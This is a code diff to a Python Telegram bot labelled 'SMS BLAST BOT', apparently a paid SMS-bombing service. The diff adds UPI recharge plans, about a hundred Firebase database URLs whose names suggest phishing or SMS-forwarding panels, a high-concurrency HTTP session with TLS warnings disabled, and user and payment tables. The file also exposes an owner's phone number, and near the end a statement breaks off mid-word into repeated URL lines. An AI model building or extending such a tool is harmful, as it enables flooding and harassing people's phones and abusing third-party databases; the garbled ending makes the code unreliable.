@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
-# 🔥 SMS BLAST BOT - FINAL ULTIMATE (FIXED) 🔥
-# Daily 2 Free Credits + 1000 User Scale
+# 🔥 SMS BLAST BOT - FINAL ULTIMATE (FIXED + RECHARGE) 🔥
 
 import re
 import os
@@ -41,8 +40,18 @@ OWNER_CONTACT_USERNAME = "@Dragon_X_king1"
 OWNER_CONTACT_LINK = "https://t.me/Dragon_X_king1"
 OWNER_PHONE = "+380 98 781 8214"
 
-# 🎁 Daily free credits given to each user once per day
 DAILY_FREE_CREDITS = 2
+
+# ============ RECHARGE CONFIG ============
+UPI_ID = "cyberxst@ybl"           # <-- CHANGE THIS
+UPI_NAME = "Dragon Owner"        # <-- CHANGE THIS
+RECHARGE_PLANS = [
+    {"id": "p1", "price": 20,  "credits": 20,  "label": "💵 ₹20  →  20 Credits"},
+    {"id": "p2", "price": 50,  "credits": 55,  "label": "💵 ₹50  →  55 Credits"},
+    {"id": "p3", "price": 100, "credits": 120, "label": "💵 ₹100 →  120 Credits"},
+    {"id": "p4", "price": 200, "credits": 250, "label": "💵 ₹200 →  250 Credits"},
+    {"id": "p5", "price": 500, "credits": 650, "label": "💵 ₹500 →  650 Credits"},
+]
 
 VIDEO_URLS = [
     "https://files.catbox.moe/iex2o2.mp4",
@@ -51,13 +60,13 @@ VIDEO_URLS = [
 ]
 
 # ============================
-# STYLISH FONT
+# STYLISH FONT (Small Caps)
 # ============================
 STYLISH_MAP = {
-    'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ғ','g':'ɢ','h':'ʜ','i':'ɪ',
+    'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ꜰ','g':'ɢ','h':'ʜ','i':'ɪ',
     'j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ',
     's':'s','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ',
-    'A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ғ','G':'ɢ','H':'ʜ','I':'ɪ',
+    'A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ꜰ','G':'ɢ','H':'ʜ','I':'ɪ',
     'J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'ǫ','R':'ʀ',
     'S':'s','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ',
 }
@@ -70,7 +79,8 @@ def st(text):
 # ============================
 BTN_BOMB      = "💣 sᴇɴᴅ sᴍs"
 BTN_CREDITS   = "💰 ᴄʀᴇᴅɪᴛs"
-BTN_REFERRAL  = "🔗 ʀᴇғᴇʀʀᴀʟ"
+BTN_RECHARGE  = "💰 ʀᴇᴄʜᴀʀɢᴇ"
+BTN_REFERRAL  = "🔗 ʀᴇꜰᴇʀʀᴀʟ"
 BTN_HISTORY   = "📜 ʜɪsᴛᴏʀʏ"
 BTN_STATUS    = "🛡️ sᴛᴀᴛᴜs"
 BTN_DEV       = "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ"
@@ -211,6 +221,220 @@ FIREBASE_URLS = [
     "https://tuuui-60b15-default-rtdb.firebaseio.com",
     "https://fir-d327e-default-rtdb.firebaseio.com",
     "https://iiilsoee-default-rtdb.firebaseio.com",
+    "https://vikasda-a78d5-default-rtdb.firebaseio.com",
+    "https://polti-1317f-default-rtdb.firebaseio.com",
+    "https://rahulbhi-default-rtdb.firebaseio.com",
+    "https://arrun01-b1ece-default-rtdb.firebaseio.com",
+    "https://rto-sandeep3-default-rtdb.firebaseio.com",
+    "https://xrafaf-bfe94-default-rtdb.firebaseio.com",
+    "https://vijay-afb12-default-rtdb.firebaseio.com",
+    "https://rontem-a082b-default-rtdb.firebaseio.com",
+    "https://adultapk-c3c4f-default-rtdb.firebaseio.com",
+    "https://harrwp-6be36-default-rtdb.firebaseio.com",
+    "https://pmnew157-default-rtdb.firebaseio.com",
+    "https://madam-ji-17e1c-default-rtdb.firebaseio.com",
+    "https://ramu-c81a7-default-rtdb.firebaseio.com",
+    "https://pm-kisan-22f92-default-rtdb.firebaseio.com",
+    "https://mainapanel-cleint-default-rtdb.firebaseio.com",
+    "https://allinone-cf029-default-rtdb.firebaseio.com",
+    "https://ramjidost-default-rtdb.firebaseio.com",
+    "https://demon-4-default-rtdb.firebaseio.com",
+    "https://hkfs-38ed5-default-rtdb.firebaseio.com",
+    "https://ashishraj2-7e2e2-default-rtdb.firebaseio.com",
+    "https://ak-boss-3a292-default-rtdb.firebaseio.com",
+    "https://yellowpanel-9f036-default-rtdb.firebaseio.com",
+    "https://tanvi-ji77-default-rtdb.firebaseio.com",
+    "https://raj-admin-nokia-default-rtdb.firebaseio.com",
+    "https://maxjoker98-2b75f-default-rtdb.firebaseio.com",
+    "https://sagarguddu-268cb-default-rtdb.firebaseio.com",
+    "https://akdk-f23fa-default-rtdb.firebaseio.com",
+    "https://tracegod-168d5-default-rtdb.firebaseio.com",
+    "https://uday-gaw-default-rtdb.firebaseio.com",
+    "https://abhirt-58f65-default-rtdb.firebaseio.com",
+    "https://krish-gana-default-rtdb.firebaseio.com",
+    "https://e10ttqaq-default-rtdb.firebaseio.com",
+    "https://oooo-2f098-default-rtdb.firebaseio.com",
+    "https://subhash-45fb2-default-rtdb.firebaseio.com",
+    "https://commotazee-darkness-default-rtdb.firebaseio.com",
+    "https://kanak-ji99-default-rtdb.firebaseio.com",
+    "https://saiyaraaa-ee8c4-default-rtdb.firebaseio.com",
+    "https://priyaknn-3e914-default-rtdb.firebaseio.com",
+    "https://urmila-ji12-default-rtdb.firebaseio.com",
+    "https://amulyaji8080-default-rtdb.firebaseio.com",
+    "https://lucky-c0915-default-rtdb.firebaseio.com",
+    "https://priya-cfdb7-default-rtdb.firebaseio.com",
+    "https://alwayssukuna-4dbb7-default-rtdb.firebaseio.com",
+    "https://jrahh-83b83-default-rtdb.firebaseio.com",
+    "https://videocalls-f3434-default-rtdb.firebaseio.com",
+    "https://mama-ji-09-default-rtdb.firebaseio.com",
+    "https://dark-1b5d9-default-rtdb.firebaseio.com",
+    "https://sakshi1-dfc80-default-rtdb.firebaseio.com",
+    "https://gojohere-29ab1-default-rtdb.firebaseio.com",
+    "https://zamzam-baba77-default-rtdb.firebaseio.com",
+    "https://ankit-raj-chutiya-default-rtdb.firebaseio.com",
+    "https://akdh-e4bf4-default-rtdb.firebaseio.com",
+    "https://arda-2fc05-default-rtdb.firebaseio.com",
+    "https://amit-6f40a-default-rtdb.firebaseio.com",
+    "https://usa-n-landon-default-rtdb.firebaseio.com",
+    "https://hjmi-5af19-default-rtdb.firebaseio.com",
+    "https://chumma-70293-default-rtdb.firebaseio.com",
+    "https://hdfc-chodo-default-rtdb.firebaseio.com",
+    "https://ravindra-d7887-default-rtdb.firebaseio.com",
+    "https://ak47-e3976-default-rtdb.firebaseio.com",
+    "https://mkdg-6a8f6-default-rtdb.firebaseio.com",
+    "https://arunku25-9479d-default-rtdb.firebaseio.com",
+    "https://ajio-427d1-default-rtdb.firebaseio.com",
+    "https://htbc51-default-rtdb.firebaseio.com",
+    "https://rurukatiu-default-rtdb.firebaseio.com",
+    "https://new-panel-1e4a9-default-rtdb.firebaseio.com",
+    "https://vasu-3rd-panel-default-rtdb.firebaseio.com",
+    "https://rrt1-c797a-default-rtdb.firebaseio.com",
+    "https://akumar-12eb3-default-rtdb.firebaseio.com",
+    "https://riya-f1832-default-rtdb.firebaseio.com",
+    "https://ghostx-panel-default-rtdb.firebaseio.com",
+    "https://rajendra-2934a-default-rtdb.firebaseio.com",
+    "https://e-challan-54-default-rtdb.firebaseio.com",
+    "https://vrajbhai-4aa6e-default-rtdb.firebaseio.com",
+    "https://hacker-panel-dcc53-default-rtdb.firebaseio.com",
+    "https://atifhehu-7ec17-default-rtdb.firebaseio.com",
+    "https://private-522a9-default-rtdb.firebaseio.com",
+    "https://bittu-panal-cleint-default-rtdb.firebaseio.com",
+    "https://soni-bbb64-default-rtdb.firebaseio.com",
+    "https://zxcvbnm-13fb3-default-rtdb.firebaseio.com",
+    "https://rahu-96df7-default-rtdb.firebaseio.com",
+    "https://courier40-30jan-default-rtdb.firebaseio.com",
+    "https://fixhogya-5b6e3-default-rtdb.firebaseio.com",
+    "https://bega-8457c-default-rtdb.firebaseio.com",
+    "https://mr-dr-72761-default-rtdb.firebaseio.com",
+    "https://sintuadmin-default-rtdb.firebaseio.com",
+    "https://vijayda-default-rtdb.firebaseio.com",
+    "https://rto-47-b39f4-default-rtdb.firebaseio.com",
+    "https://maja-1c323-default-rtdb.firebaseio.com",
+    "https://benga-7d896-default-rtdb.firebaseio.com",
+    "https://bipin-57f82-default-rtdb.firebaseio.com",
+    "https://sumankr5764-e0ba8-default-rtdb.firebaseio.com",
+    "https://kattapa-7faf3-default-rtdb.firebaseio.com",
+    "https://rahudf-default-rtdb.firebaseio.com",
+    "https://udyydfuuhc-default-rtdb.firebaseio.com",
+]
+
+# ============================
+# HTTP SESSION
+# ============================
+try:
+    import urllib3
+    urllib3.disable_warnings()
+except Exception:
+    pass
+
+HTTP_SESSION = requests.Session()
+adapter = requests.adapters.HTTPAdapter(
+    pool_connections=50,
+    pool_maxsize=100,
+    max_retries=0,
+    pool_block=False
+)
+HTTP_SESSION.mount('http://', adapter)
+HTTP_SESSION.mount('https://', adapter)
+HTTP_SESSION.headers.update({'Connection': 'keep-alive'})
+
+EXECUTOR = concurrent.futures.ThreadPoolExecutor(max_workers=50)
+GLOBAL_SEMAPHORE = asyncio.Semaphore(100)
+
+# ============================
+# GLOBAL STATE
+# ============================
+ACTIVE_TASKS = {}
+ACTIVE_STOP_FLAGS = {}
+
+_DEVICE_CACHE = {"count": 8347, "ts": 0}
+_DEVICE_CACHE_LOCK = asyncio.Lock()
+
+# ============================
+# DATABASE
+# ============================
+DB_PATH = "bot_data.db"
+
+def init_db():
+    conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
+    c = conn.cursor()
+    c.execute('''CREATE TABLE IF NOT EXISTS users (
+        user_id INTEGER PRIMARY KEY, credits INTEGER DEFAULT 0,
+        referrer_id INTEGER, joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        last_daily_credit TEXT)''')
+    c.execute('''CREATE TABLE IF NOT EXISTS banned_users (
+        user_id INTEGER PRIMARY KEY, banned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        banned_by INTEGER)''')
+    c.execute('''CREATE TABLE IF NOT EXISTS payments (
+        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER,
+        credits_given INTEGER, transaction_id TEXT, screenshot_id TEXT,
+        status TEXT DEFAULT 'pending', created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
+    c.execute('''CREATE TABLE IF NOT EXISTS user_history (
+        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, action TEXT,
+        details TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
+    c.execute('''CREATE TABLE IF NOT EXISTS redeem_keys (
+        id INTEGER PRIMARY KEY AUTOINCREMENT, key TEXT UNIQUE, credits INTEGER,
+        used_by INTEGER, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        used_at TIMESTAMP)''')
+    c.execute('''CREATE TABLE IF NOT EXISTS maintenance (
+        id INTEGER PRIMARY KEY, status INTEGER DEFAULT 0,
+        message TEXT DEFAULT 'Bot is under maintenance.')''')
+    c.execute("INSERT OR IGNORE INTO maintenance (id, status) VALUES (1, 0)")
+    try:
+        c.execute("ALTER TABLE users ADD COLUMN last_daily_credit TEXT")
+    except sqlite3.OperationalError:
+        pass
+    conn.commit()
+    conn.close()
+
+init_db()
+
+# ============================
+# DB HELPERS
+# ============================
+def _get_conn():
+    conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
+    conn.execute("PRAGMA journal_mode=WAL")
+    conn.execute("PRAGMA synchronous=NORMAL")
+    return conn
+
+def is_owner(user_id): return user_id == OWNER_ID
+
+def get_user_credits(user_id):
+    conn = _get_conn()
+    c = conn.cursor()
+    c.execute("SELECT credits FROM users WHERE user_id = ?", (user_id,))
+    row = c.fetchone()
+    conn.close()
+    if row: return row[0]
+    add_new_user(user_id)
+    return DAILY_FREE_CREDITS
+
+def add_new_user(user_id, referrer_id=None):
+    conn = _get_conn()
+    c = conn.cursor()
+    c.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
+    if c.fetchone():
+        conn.close(); return
+    today = datetime.now().strftime('%Y-%m-%d')
+    c.execute("INSERT INTO users (user_id, credits, referrer_id, last_daily_credit) VALUES (?, ?, ?, ?)",
+              (user_id, DAILY_FREE_CREDITS, referrer_id, today))
+    conn.commit()
+    conn.close()
+    if referrer_id and referrer_id != user_id:
+        conn2 = _get_conn()
+        c2 = conn2.cursor()
+        c2.execute("SELECT credits FROM users WHERE user_id = ?", (referrer_id,))
+        if c2.fetchone():
+            c2.execute("UPDATE users SET credits = credits + 1 WHERE user_id = ?", (referrer_id,))
+            conn2.commit()
+        conn2.close()
+
+def give_daily_credits(user_id):
+    today = datetime.now().strftime('%Y-%m-%d')
+    conn = _get_conn()
+    c = conn.cursor()
+    c.execubaseio.com",
     "https://vikasda-a78d5-default-rtdb.firebaseio.com",
     "https://polti-1317f-default-rtdb.firebaseio.com",
     "https://rahulbhi-default-rtdb.firebaseio.com",
